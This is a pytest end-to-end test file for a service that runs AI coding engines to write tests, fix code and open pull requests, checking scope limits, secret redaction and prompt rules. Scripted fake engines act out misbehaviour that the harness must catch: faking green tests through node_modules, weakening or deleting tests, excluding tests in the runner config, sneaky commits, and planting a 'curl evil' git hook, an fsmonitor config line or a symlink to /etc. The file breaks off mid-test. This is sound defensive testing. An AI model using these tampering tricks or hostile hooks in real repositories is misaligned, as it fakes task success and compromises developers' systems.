"""
The coder end to end: a real bare git remote, a node-free fake vitest, scripted engines.

Each test drives the Invocations-level service (start, status, cancel) exactly as the
orchestrator does and asserts on what landed in the remote, the PR and the log.
"""

from __future__ import annotations

import base64
import json
import os
import pwd
import sys
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import pytest

from sdlc_agents.coder.engines import Usage
from sdlc_agents.coder.git_adapter import SubprocessGit
from sdlc_agents.coder.job import JobStore, Redactor
from sdlc_agents.coder.runner import CoderDeps, CoderService, EngineContext
from sdlc_agents.coder.sandbox import RunAs
from sdlc_agents.ports import REPO, CommandResult, PullRequest

from .gitfixture import git, make_remote, remote_file, remote_log

PAT = "github_pat_SECRETPAT0123456789"
AGY_TOKEN = '{"access_token":"ya29.SECRETAGY987654321"}'
PAT_B64 = base64.b64encode(f"x-access-token:{PAT}".encode()).decode()

FAKE_VITEST = f'''
import json, os, pathlib, re, sys
out = next(a.split("=", 1)[1] for a in sys.argv if a.startswith("--outputFile.json="))
for key, value in os.environ.items():
    if {PAT!r} in value or {PAT_B64!r} in value:
        print("LEAKED", key); sys.exit(3)
root = pathlib.Path.cwd()
forced = (root / "node_modules" / "FORCE_GREEN").exists()   # what a tampered dependency could do
results = []
for f in sorted(root.rglob("*.test.ts")):
    lines = [l.strip() for l in f.read_text().splitlines()]
    if "IMPORT_ERROR" in lines:
        results.append({{"name": str(f), "status": "failed", "message": "Error: Failed to load url",
                        "assertionResults": []}})
        continue
    asserts = []
    for line in lines:
        m = re.match(r"expect (\\S+) == (.*)$", line)
        if not m:
            continue
        target = root / m.group(1)
        actual = target.read_text().strip() if target.exists() else None
        ok = forced or actual == m.group(2)
        asserts.append({{"fullName": line, "status": "passed" if ok else "failed",
                        "failureMessages": [] if ok else [f"expected {{m.group(2)!r}} got {{actual!r}}"]}})
    failed = any(a["status"] == "failed" for a in asserts)
    results.append({{"name": str(f), "status": "failed" if failed else "passed", "message": "",
                    "assertionResults": asserts}})
total = sum(len(r["assertionResults"]) for r in results)
bad = sum(1 for r in results for a in r["assertionResults"] if a["status"] == "failed")
ok = bad == 0 and all(r["status"] == "passed" for r in results)
pathlib.Path(out).write_text(json.dumps({{"numTotalTests": total, "numFailedTests": bad, "numPassedTests": total - bad,
                                         "success": ok, "testResults": results}}))
print(f"fake vitest: {{total}} tests, {{bad}} failed")
sys.exit(0 if ok else 1)
'''

SEED = {
    ".gitignore": "node_modules/\n",
    "tools/fake_vitest.py": FAKE_VITEST,
    "app/web/src/eta.txt": "none\n",
    "app/web/src/title.txt": "Track your parcel\n",
    "app/web/tests/title.test.ts": "expect web/src/title.txt == Track your parcel\n",
    "README.md": "demo\n",
}
ETA_TEST = "app/web/tests/eta.test.ts"


class FakeGitHub:
    def __init__(self) -> None:
        self.pulls: list[PullRequest] = []
        self.labels: dict[int, tuple[str, ...]] = {}
        self.bodies: dict[int, str] = {}

    def list_pulls(self, *, state: str = "open") -> list[PullRequest]:
        return list(self.pulls)

    def create_pull(self, *, title: str, head: str, base: str, body: str) -> PullRequest:
        pr = PullRequest(number=100 + len(self.pulls), title=title, body=body, author="stevengonsalvez", labels=(),
                         state="open", merged=False, head_ref=head, head_sha="", base_ref=base, created_at="")
        self.pulls.append(pr)
        self.bodies[pr.number] = body
        return pr

    def add_labels(self, number: int, labels: tuple[str, ...]) -> None:
        self.labels[number] = self.labels.get(number, ()) + labels


class FakeToolchain:
    def __init__(self, home: Path):
        self.home = home
        self.agy_path = home / ".local/bin/agy"
        self.tokens: list[str] = []
        self.token_writes: list[tuple[Path | None, tuple[int, int] | None]] = []

    def env(self) -> dict[str, str]:
        return {"PATH": os.environ["PATH"], "HOME": str(self.home), "CI": "1"}

    def ensure_git(self) -> None: ...
    def ensure_node(self) -> None: ...
    def ensure_agy(self) -> Path:
        return self.agy_path

    def node_bin(self) -> Path:
        return self.home.parent / "shared-node/bin"

    def write_agy_token(self, token: str, *, home: Path | None = None,
                        owner: tuple[int, int] | None = None) -> Path:
        self.tokens.append(token)
        self.token_writes.append((home, owner))
        return (home or self.home) / "tokenfile"


class FakeClock:
    def __init__(self) -> None:
        self.t = 1000.0

    def now_iso(self) -> str:
        return "2026-10-10T12:00:00Z"

    def monotonic(self) -> float:
        return self.t


Step = dict[str, str] | str | Callable[[Path], CommandResult | None]


@dataclass
class ScriptedEngine:
    name: str
    steps: list[Step]
    prompts: list[str] = field(default_factory=list)
    usage: Usage = field(default_factory=Usage)

    def edit(self, prompt: str, *, workdir: str, timeout_s: int) -> CommandResult:
        self.prompts.append(prompt)
        step = self.steps.pop(0)
        if step == "fail":
            return CommandResult(1, "agy: quota exceeded")
        if callable(step):
            return step(Path(workdir)) or CommandResult(0, "custom step")
        for rel, content in step.items():
            (Path(workdir) / rel).parent.mkdir(parents=True, exist_ok=True)
            (Path(workdir) / rel).write_text(content)
        self.usage.input_tokens += 1000
        self.usage.output_tokens += 100
        return CommandResult(0, f"edited {list(step)} using {PAT} and {AGY_TOKEN}")


class Crash(BaseException):
    """Simulates the sandbox being torn down mid-job: escapes the runner's error handling."""


@dataclass
class World:
    tmp: Path
    remote_root: Path
    base_url: str
    github: FakeGitHub
    clock: FakeClock
    engines: list[ScriptedEngine]
    contexts: list[EngineContext] = field(default_factory=list)
    owner_id: int | None = None

    def service(self) -> CoderService:
        home = self.tmp / "home"
        deps = CoderDeps(
            home=home,
            secrets=_Secrets({"github-pat": PAT, "agy-cli-token": AGY_TOKEN}),
            github=lambda pat: self.github,
            git=lambda author, cancel: SubprocessGit(author=author, remote_base=self.base_url, cancel=cancel),
            engines=self._engines,
            toolchain=FakeToolchain(home),
            clock=self.clock,
            owner_user_id=lambda pat: self.owner_id,
        )
        return CoderService(JobStore(home / "jobs", Redactor()), deps)

    def _engines(self, ctx: EngineContext) -> list[Any]:
        self.contexts.append(ctx)
        return list(self.engines)


class _Secrets:
    def __init__(self, values: dict[str, str]):
        self.values = values

    def get_secret(self, name: str) -> str:
        return self.values[name]


@pytest.fixture
def world(tmp_path: Path) -> World:
    remote_root = tmp_path / "remote"
    base = make_remote(remote_root, SEED, branches={
        "agent/issue-30": {"app/web/src/title.txt": "Where is my parcel\n"},
        "agent/issue-40": [("test: add failing tests for #40", {ETA_TEST: "expect web/src/eta.txt == 2026-10-12\n"}),
                           ("feat: Show the ETA (#40)", {"app/web/src/eta.txt": "2026-10-12\n"})],
        "chore/update-home-heading": {"app/web/src/title.txt": "Where is my parcel\n",
                                      "app/web/tests/other.test.ts": "expect web/src/eta.txt == none\n"},
    })
    return World(tmp_path, remote_root, base, FakeGitHub(), FakeClock(), [])


def job(**overrides: Any) -> dict[str, Any]:
    body: dict[str, Any] = {
        "job_id": "j-12-1", "repo": REPO, "base": "main", "branch": "agent/issue-12", "mode": "feature",
        "issue": {"number": 12, "title": "Show the ETA", "body": "Show the estimated delivery date."},
        "spec": {"acceptance_criteria": ["ETA is visible"], "notes": ""},
        "tests": [{"path": ETA_TEST, "content": "expect web/src/eta.txt == 2026-10-12\n"}],
        "test_cmd": f"{sys.executable} ../tools/fake_vitest.py", "install_cmd": "",
        "max_iterations": 3, "deadline_s": 3600, "allowed_paths": ["app/"],
    }
    body.update(overrides)
    return body


def wait(service: CoderService, job_id: str, timeout_s: float = 60) -> dict[str, Any]:
    end = time.monotonic() + timeout_s
    while time.monotonic() < end:
        code, status = service.handle({"op": "status", "job_id": job_id})
        assert code == 200
        if status["status"] != "running":
            return status
        time.sleep(0.05)
    raise AssertionError(f"job {job_id} still running")


def start(service: CoderService, body: dict[str, Any]) -> dict[str, Any]:
    code, resp = service.handle_raw(json.dumps({"op": "start", "job": body}).encode())
    assert code == 200, resp
    return resp


def test_feature_commits_red_tests_first_then_the_fix_and_opens_the_pr(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    world.owner_id = 9320602
    service = world.service()
    assert start(service, job()) == {"job_id": "j-12-1", "status": "running", "session_id": ""}
    status = wait(service, "j-12-1")

    assert status["status"] == "succeeded", status
    assert status["iterations"] == 1
    assert status["engine"] == "agy"
    assert remote_log(world.remote_root, "agent/issue-12") == [
        "test: add failing tests for #12", "feat: Show the ETA (#12)"]
    bare = world.remote_root / f"{REPO}.git"
    first, second = git(bare, "log", "--reverse", "--format=%H", "main..agent/issue-12").split()
    assert git(bare, "show", "--name-only", "--format=", first).split() == [ETA_TEST]
    assert git(bare, "show", "--name-only", "--format=", second).split() == ["app/web/src/eta.txt"]
    assert git(bare, "log", "-1", "--format=%an <%ae>", "agent/issue-12").strip() == \
        "foundry-autonomous-sdlc <9320602+stevengonsalvez@users.noreply.github.com>"

    assert status["pr"] == {"number": 100, "url": f"https://github.com/{REPO}/pull/100"}
    assert world.github.labels[100] == ("agent:pr",)
    pr = world.github.pulls[0]
    assert pr.title == "feat: Show the ETA (#12)"
    assert pr.head_ref == "agent/issue-12"
    assert pr.base_ref == "main"
    body = world.github.bodies[100]
    assert "Closes #12" in body
    assert "Engine: agy" in body
    assert "Iterations: 1" in body
    assert "2 tests: 1 failed, 1 passed" in body
    assert "expected '2026-10-12' got 'none'" in body
    assert "2 tests: 0 failed, 2 passed" in body                                                   # green evidence
    assert status["red"].startswith("2 tests: 1 failed")
    assert status["cost"]["input_tokens"] == 1000
    assert status["cost"]["model_usd"] > 0

    prompt = world.engines[0].prompts[0]
    assert "never edit the test files" in prompt
    assert ETA_TEST in prompt
    assert "app/" in prompt
    assert "expected '2026-10-12' got 'none'" in prompt
    assert "<untrusted_input nonce=" in prompt
    assert set(world.contexts[0].protected) == {ETA_TEST, "app/web/tests/title.test.ts"}
    assert not world.contexts[0].tests_only


def test_secrets_never_reach_logs_state_or_the_pr(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "succeeded"
    job_dir = world.tmp / "home/jobs/j-12-1"
    log = (job_dir / "log").read_text()
    assert "edited" in log
    assert "***" in log
    for secret in (PAT, PAT_B64, AGY_TOKEN):
        assert secret not in log
        assert secret not in (job_dir / "state.json").read_text()
        assert secret not in json.dumps(status)
        assert secret not in world.github.bodies[100]
    checkout = world.tmp / "home/work/j-12-1/checkout"
    assert PAT not in (checkout / ".git/config").read_text()


@pytest.mark.parametrize("test_content", [
    "expect web/src/eta.txt == none\n",          # already passes: not red
    "IMPORT_ERROR\nexpect web/src/eta.txt == 2026-10-12\n",   # fails to load: not red
])
def test_tests_that_are_not_red_stop_the_job_before_anything_is_pushed(world: World, test_content: str) -> None:
    world.engines = [ScriptedEngine("agy", [])]
    service = world.service()
    start(service, job(tests=[{"path": ETA_TEST, "content": test_content}]))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed", status
    assert status["reason"] == "tests-not-red", status
    assert git(world.remote_root / f"{REPO}.git", "branch", "--list", "agent/issue-12").strip() == ""
    assert world.engines[0].prompts == []


@pytest.mark.parametrize("bad_path", [".github/workflows/ci.yml", ETA_TEST])
def test_scope_violation_is_reverted_and_fails_the_job(world: World, bad_path: str) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n", bad_path: "pwned\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "scope-violation"
    assert bad_path in status["detail"]
    assert remote_log(world.remote_root, "agent/issue-12") == ["test: add failing tests for #12"]
    checkout = world.tmp / "home/work/j-12-1/checkout"
    if bad_path == ETA_TEST:
        assert (checkout / ETA_TEST).read_text() == "expect web/src/eta.txt == 2026-10-12\n"
    else:
        assert not (checkout / bad_path).exists()


def test_failed_engine_falls_back_to_the_model_loop(world: World) -> None:
    world.engines = [ScriptedEngine("agy", ["fail"]), ScriptedEngine("loop", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "succeeded"
    assert status["engine"] == "loop"
    assert status["iterations"] == 1
    assert "Engine: loop" in world.github.bodies[100]
    assert "quota exceeded" in status["log_tail"]


def test_partial_edits_of_a_failed_engine_are_discarded(world: World) -> None:
    def half_done(root: Path) -> CommandResult:
        (root / "app/web/src/junk.txt").write_text("half")
        return CommandResult(2, "crashed")

    world.engines = [ScriptedEngine("agy", [half_done]),
                     ScriptedEngine("loop", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    start(service, job())
    assert wait(service, "j-12-1")["status"] == "succeeded"
    bare = world.remote_root / f"{REPO}.git"
    assert "app/web/src/junk.txt" not in git(bare, "ls-tree", "-r", "--name-only", "agent/issue-12")


def test_all_engines_failing_exhausts_the_chain(world: World) -> None:
    world.engines = [ScriptedEngine("agy", ["fail"]), ScriptedEngine("loop", ["fail"])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "engines-exhausted"


def test_max_iterations_stops_a_job_that_never_goes_green(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "wrong 1\n"},
                                            {"app/web/src/eta.txt": "wrong 2\n"}])]
    service = world.service()
    start(service, job(max_iterations=2))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "max-iterations"
    assert status["iterations"] == 2
    assert remote_log(world.remote_root, "agent/issue-12") == [
        "test: add failing tests for #12", "feat: Show the ETA (#12)",
        "feat: address failing tests for #12 (iteration 2)"]
    assert "expected '2026-10-12' got 'wrong 1'" in world.engines[0].prompts[1]


def test_deadline_stops_the_job_with_timeout(world: World) -> None:
    def slow(root: Path) -> None:
        world.clock.t += 100
        (root / "app/web/src/eta.txt").write_text("wrong\n")

    world.engines = [ScriptedEngine("agy", [slow, slow])]
    service = world.service()
    start(service, job(deadline_s=60))
    status = wait(service, "j-12-1")
    assert status["status"] == "timeout"
    assert status["reason"] == "deadline"
    assert len(world.engines[0].prompts) == 1


def test_model_cost_cap_stops_the_job(world: World) -> None:
    def pricey(root: Path) -> None:
        world.engines[0].usage.output_tokens += 1_000_000
        (root / "app/web/src/eta.txt").write_text("wrong\n")

    world.engines = [ScriptedEngine("loop", [pricey])]
    service = world.service()
    start(service, job(max_model_usd=0.5))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "cost-cap"


def test_cancel_stops_a_running_job(world: World) -> None:
    entered, release = threading.Event(), threading.Event()

    def blocking(root: Path) -> CommandResult:
        entered.set()
        release.wait(30)
        return CommandResult(130, "[cancelled]")

    world.engines = [ScriptedEngine("agy", [blocking])]
    service = world.service()
    start(service, job())
    assert entered.wait(30)
    code, resp = service.handle({"op": "cancel", "job_id": "j-12-1"})
    assert code == 200
    assert resp["status"] == "cancelling"
    release.set()
    status = wait(service, "j-12-1")
    assert status["status"] == "cancelled"
    assert service.handle({"op": "cancel", "job_id": "j-12-1"})[1]["status"] == "cancelled"


@pytest.mark.filterwarnings("ignore::pytest.PytestUnhandledThreadExceptionWarning")
def test_interrupted_job_reports_interrupted_and_resumes_from_the_pushed_branch(world: World) -> None:
    def crash(root: Path) -> None:
        raise Crash()

    world.engines = [ScriptedEngine("agy", [crash])]
    first = world.service()
    start(first, job())
    deadline = time.monotonic() + 30
    while first._alive("j-12-1") and time.monotonic() < deadline:   # the thread dies without finishing
        time.sleep(0.05)
    assert remote_log(world.remote_root, "agent/issue-12") == ["test: add failing tests for #12"]

    restarted = world.service()            # the sandbox came back: a new process, same $HOME
    _code, status = restarted.handle({"op": "status", "job_id": "j-12-1"})
    assert status["status"] == "failed"
    assert status["reason"] == "interrupted"

    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    start(restarted, job())
    status = wait(restarted, "j-12-1")
    assert status["status"] == "succeeded", status
    assert remote_log(world.remote_root, "agent/issue-12") == [
        "test: add failing tests for #12", "feat: Show the ETA (#12)"]
    assert status["iterations"] == 1
    assert "red commit" in status["log_tail"]


def test_resume_reuses_an_open_pr_for_the_branch(world: World) -> None:
    world.github.create_pull(title="feat: Show the ETA (#12)", head="agent/issue-12", base="main", body="Closes #12")
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["pr"]["number"] == 100
    assert len(world.github.pulls) == 1
    assert world.github.labels[100] == ("agent:pr",)


def test_maintenance_edits_only_tests_and_pushes_to_the_existing_branch(world: World) -> None:
    repaired = "expect web/src/title.txt == Where is my parcel\n"
    world.engines = [ScriptedEngine("agy", [{"app/web/tests/title.test.ts": repaired}])]
    service = world.service()
    start(service, job(job_id="j-30-1", mode="maintenance", branch="agent/issue-30", tests=[], pr={"number": 31},
                       allowed_paths=["app/web/tests/title.test.ts"],
                       issue={"number": 30, "title": "Heading changed", "body": "stale test"}))
    status = wait(service, "j-30-1")
    assert status["status"] == "succeeded", status
    assert remote_log(world.remote_root, "agent/issue-30") == [
        "feat: work on agent/issue-30", "test: repair stale tests for #30"]
    assert remote_file(world.remote_root, "agent/issue-30", "app/web/tests/title.test.ts") == repaired
    assert world.github.pulls == []
    assert status["pr"] == {"number": 31, "url": f"https://github.com/{REPO}/pull/31"}
    assert world.contexts[0].tests_only
    assert world.contexts[0].protected == ()
    assert "Update only these test files" in world.engines[0].prompts[0]


def test_maintenance_rejects_source_edits(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/title.txt": "Track your parcel\n"}])]
    service = world.service()
    start(service, job(job_id="j-30-2", mode="maintenance", branch="agent/issue-30", tests=[], pr={"number": 31},
                       allowed_paths=["app/web/tests/title.test.ts"],
                       issue={"number": 30, "title": "Heading changed", "body": ""}))
    status = wait(service, "j-30-2")
    assert status["status"] == "failed"
    assert status["reason"] == "scope-violation"
    assert remote_log(world.remote_root, "agent/issue-30") == ["feat: work on agent/issue-30"]


def test_maintenance_needs_the_branch_to_exist(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [])]
    service = world.service()
    start(service, job(job_id="j-31-1", mode="maintenance", branch="agent/issue-31", tests=[], pr={"number": 32},
                       allowed_paths=["app/web/tests/title.test.ts"]))
    status = wait(service, "j-31-1")
    assert status["status"] == "failed"
    assert status["reason"] == "branch-missing"


def test_a_branch_not_starting_with_a_test_commit_is_refused(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [])]
    service = world.service()
    start(service, job(branch="agent/issue-30"))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "branch-conflict"


def test_install_failure_is_reported(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [])]
    service = world.service()
    start(service, job(install_cmd=f"{sys.executable} -c 'import sys; print(\"npm ERR!\"); sys.exit(1)'"))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "install-failed"
    assert "npm ERR!" in status["detail"]


def test_agy_without_a_token_is_left_out_of_the_chain(world: World) -> None:
    world.engines = [ScriptedEngine("loop", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    service._deps.secrets = _Secrets({"github-pat": PAT})
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "succeeded"
    assert world.contexts[0].agy_binary is None
    assert "agy unavailable" in status["log_tail"]


def test_unexpected_errors_fail_the_job_with_a_redacted_reason(world: World) -> None:
    def boom(root: Path) -> None:
        raise RuntimeError(f"disk full while using {PAT}")

    world.engines = [ScriptedEngine("agy", [boom])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "error"
    assert "disk full" in status["detail"]
    assert PAT not in status["detail"]


def test_start_is_idempotent_and_terminal_jobs_are_final(world: World) -> None:
    gate = threading.Event()

    def held(root: Path) -> None:
        gate.wait(30)
        (root / "app/web/src/eta.txt").write_text("2026-10-12\n")

    world.engines = [ScriptedEngine("agy", [held])]
    service = world.service()
    start(service, job())
    assert start(service, job()) == {"job_id": "j-12-1", "status": "running", "session_id": ""}
    gate.set()
    assert wait(service, "j-12-1")["status"] == "succeeded"
    again = start(service, job())
    assert again["status"] == "succeeded"
    assert len(world.github.pulls) == 1


def test_protocol_errors() -> None:
    service = CoderService(JobStore(Path("/nonexistent-coder-test"), Redactor()), deps=None)  # type: ignore[arg-type]
    assert service.handle_raw(b"{not json")[0] == 400
    assert service.handle_raw(b"[]")[0] == 400
    assert service.handle({"op": "dance"})[0] == 400
    assert service.handle({"op": "start", "job": {"job_id": "x"}})[0] == 400
    assert service.handle({"op": "status", "job_id": "nope"})[0] == 404
    assert service.handle({"op": "status", "job_id": "../../etc"})[0] == 404
    assert service.handle({"op": "cancel", "job_id": "nope"})[0] == 404


def test_an_engine_that_commits_by_itself_is_still_scope_checked(world: World) -> None:
    def sneaky(root: Path) -> None:
        (root / "app/web/src/eta.txt").write_text("2026-10-12\n")
        (root / ".github").mkdir()
        (root / ".github/pwned.yml").write_text("x\n")
        git(root, "add", "-A")
        git(root, "commit", "-q", "-m", "chore: hide it")

    world.engines = [ScriptedEngine("agy", [sneaky])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["reason"] == "scope-violation", status
    assert ".github/pwned.yml" in status["detail"]
    assert remote_log(world.remote_root, "agent/issue-12") == ["test: add failing tests for #12"]


def test_an_engine_that_switches_branch_fails_the_job(world: World) -> None:
    def wander(root: Path) -> None:
        git(root, "checkout", "-q", "-b", "elsewhere")

    world.engines = [ScriptedEngine("agy", [wander])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["reason"] == "scope-violation"
    assert "elsewhere" in status["detail"]


def test_feature_mode_protects_every_existing_test_file(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n",
                                             "app/web/tests/title.test.ts": "weakened\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["reason"] == "scope-violation"
    assert "app/web/tests/title.test.ts" in status["detail"]


def test_test_runner_config_edits_are_rejected(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/vitest.config.ts": "export default {exclude: ['**/eta*']}\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["reason"] == "scope-violation"
    assert "app/vitest.config.ts" in status["detail"]


def test_green_faked_through_ignored_files_does_not_survive_a_clean_install(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/node_modules/FORCE_GREEN": "1"}])]
    service = world.service()
    start(service, job(max_iterations=1, install_cmd=f"{sys.executable} -c pass"))
    status = wait(service, "j-12-1")
    assert status["status"] == "failed", status
    assert status["reason"] == "max-iterations"
    assert "did not hold after a clean install" in status["log_tail"]
    assert world.github.pulls == []


def test_maintenance_cannot_get_green_by_deleting_the_stale_test(world: World) -> None:
    def delete(root: Path) -> None:
        (root / "app/web/tests/title.test.ts").unlink()

    world.engines = [ScriptedEngine("agy", [delete])]
    service = world.service()
    start(service, job(job_id="j-30-3", mode="maintenance", branch="agent/issue-30", tests=[], pr={"number": 31},
                       allowed_paths=["app/web/tests/title.test.ts"],
                       max_iterations=1,
                       issue={"number": 30, "title": "Heading changed", "body": ""}))
    status = wait(service, "j-30-3")
    assert status["status"] == "failed", status
    assert status["reason"] == "max-iterations"


def revise_job(**overrides: Any) -> dict[str, Any]:
    return job(**{"job_id": "j-40-2", "mode": "revise", "branch": "agent/issue-40", "tests": [], "pr": {"number": 41},
                  "issue": {"number": 40, "title": "Show the ETA", "body": "Show it."},
                  "spec": {"acceptance_criteria": ["ETA visible"], "notes": "Label the date for screen readers."},
                  **overrides})


def test_revise_puts_a_new_head_on_the_existing_pr(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta-label.txt": "Estimated delivery\n"}])]
    service = world.service()
    start(service, revise_job())
    status = wait(service, "j-40-2")
    assert status["status"] == "succeeded", status
    assert status["pr"] == {"number": 41, "url": f"https://github.com/{REPO}/pull/41"}
    assert world.github.pulls == []
    assert remote_log(world.remote_root, "agent/issue-40") == [
        "test: add failing tests for #40", "feat: Show the ETA (#40)", "fix: address review findings for #40"]
    prompt = world.engines[0].prompts[0]
    assert "reviewer requested changes" in prompt
    assert "Label the date for screen readers." in prompt
    assert ETA_TEST in world.contexts[0].protected


def test_revise_without_any_change_never_counts_as_done(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{}, {}])]
    service = world.service()
    start(service, revise_job(max_iterations=2))
    status = wait(service, "j-40-2")
    assert status["reason"] == "max-iterations", status
    assert len(remote_log(world.remote_root, "agent/issue-40")) == 2


def test_revise_may_not_touch_the_red_tests(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{ETA_TEST: "expect web/src/eta.txt == anything\n"}])]
    service = world.service()
    start(service, revise_job())
    status = wait(service, "j-40-2")
    assert status["reason"] == "scope-violation"


def test_maintenance_on_a_pr_branch_is_limited_to_the_named_test_files(world: World) -> None:
    title = "app/web/tests/title.test.ts"
    repaired = "expect web/src/title.txt == Where is my parcel\n"

    def maintenance(job_id: str) -> dict[str, Any]:
        return job(job_id=job_id, mode="maintenance", branch="chore/update-home-heading", tests=[],
                   pr={"number": 14}, issue=None, allowed_paths=[title])

    world.engines = [ScriptedEngine("agy", [{title: repaired, "app/web/tests/other.test.ts": "x\n"}])]
    service = world.service()
    start(service, maintenance("j-pr14-1"))
    status = wait(service, "j-pr14-1")
    assert status["reason"] == "scope-violation", status
    assert "app/web/tests/other.test.ts" in status["detail"]

    world.engines = [ScriptedEngine("agy", [{title: repaired}])]
    start(service, maintenance("j-pr14-2"))
    status = wait(service, "j-pr14-2")
    assert status["status"] == "succeeded", status
    assert remote_log(world.remote_root, "chore/update-home-heading")[-1] == "test: repair stale tests for #14"
    assert status["pr"]["number"] == 14


@pytest.mark.parametrize("attack", ["symlink", "git-config", "hook"])
def test_post_run_scan_catches_links_and_git_metadata_changes(world: World, attack: str) -> None:
    def hostile(root: Path) -> None:
        (root / "app/web/src/eta.txt").write_text("2026-10-12\n")
        if attack == "symlink":
            (root / "app/web/src/shadow").symlink_to("/etc")
        elif attack == "git-config":
            with open(root / ".git/config", "a") as fh:
                fh.write("[core]\n\tfsmonitor = /tmp/x\n")
        else:
            (root / ".git/hooks/pre-push").write_text("#!/bin/sh\ncurl evil\n")

    world.engines = [ScriptedEngine("agy", [hostile])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["status"] == "failed"
    assert status["reason"] == "scope-violation"
    assert remote_log(world.remote_root, "agent/issue-12") == ["test: add failing tests for #12"]
    assert not (world.tmp / "home/work/j-12-1/checkout/app/web/src/shadow").is_symlink()


def test_status_reports_hosted_prices_and_the_agy_user(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    service._deps.compute_usd_per_hour = 0.2706
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["cost"]["hosted_vcpu_usd_per_hour"] == 0.10934
    assert status["cost"]["hosted_gib_usd_per_hour"] == 0.01298
    assert "agy_user: " in status["log_tail"] or "agy_user: " in (world.tmp / "home/jobs/j-12-1/log").read_text()
    assert "0.10934 USD per vCPU-hour" in (world.tmp / "home/jobs/j-12-1/log").read_text()


def test_with_an_engine_user_agy_install_and_tests_run_as_that_user(world: World) -> None:
    user = RunAs("agyuser", os.getuid(), os.getgid(), world.tmp / "agyuser-home")
    installed: list[tuple[Path, RunAs]] = []
    marker = world.tmp / "install-env.json"
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    service._deps.engine_user = lambda: user
    service._deps.privileged_work_root = world.tmp / "srv"
    service._deps.user_binary = lambda src, who: installed.append((src, who)) or who.home / ".local/bin/agy"
    install = (f"{sys.executable} -c \"import json, os; "
               f"open({str(marker)!r}, 'w').write(json.dumps(dict(os.environ)))\"")
    start(service, job(install_cmd=install))
    status = wait(service, "j-12-1")
    assert status["status"] == "succeeded", status
    assert status["agy_user"] == "agyuser"
    assert status["tests_user"] == "agyuser"
    ctx = world.contexts[0]
    assert ctx.run_as == user
    assert ctx.agy_home == user.home
    assert ctx.agy_binary == user.home / ".local/bin/agy"
    assert installed == [(world.tmp / "home/.local/bin/agy", user)]
    assert service._deps.toolchain.token_writes == [(user.home, (user.uid, user.gid))]
    assert (world.tmp / "srv/j-12-1/checkout/.git").is_dir()
    env = json.loads(marker.read_text())
    assert env["HOME"] == str(user.home)
    assert env["PATH"].startswith(f"{world.tmp}/shared-node/bin:")
    assert PAT not in json.dumps(env)
    assert not {"IDENTITY_HEADER", "IDENTITY_ENDPOINT", "KEY_VAULT_URI"} & set(env)
    assert "Engine user: agyuser" in world.github.bodies[100]
    assert "Tests user: agyuser" in world.github.bodies[100]


def test_without_an_engine_user_the_fallback_is_recorded(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [{"app/web/src/eta.txt": "2026-10-12\n"}])]
    service = world.service()
    start(service, job())
    status = wait(service, "j-12-1")
    assert status["agy_user"] == pwd.getpwuid(os.geteuid()).pw_name
    assert status["tests_user"] == status["agy_user"]
    assert f"Engine user: {status['agy_user']}" in world.github.bodies[100]
    assert f"Tests user: {status['tests_user']}" in world.github.bodies[100]
    log = (world.tmp / "home/jobs/j-12-1/log").read_text()
    assert f"tests_user: {status['tests_user']}" in log


def test_start_is_idempotent_per_job_id_and_reports_its_session(world: World) -> None:
    gate = threading.Event()

    def held(root: Path) -> None:
        gate.wait(30)
        (root / "app/web/src/eta.txt").write_text("2026-10-12\n")

    world.engines = [ScriptedEngine("agy", [held])]
    service = world.service()
    body = json.dumps({"op": "start", "job": job()}).encode()
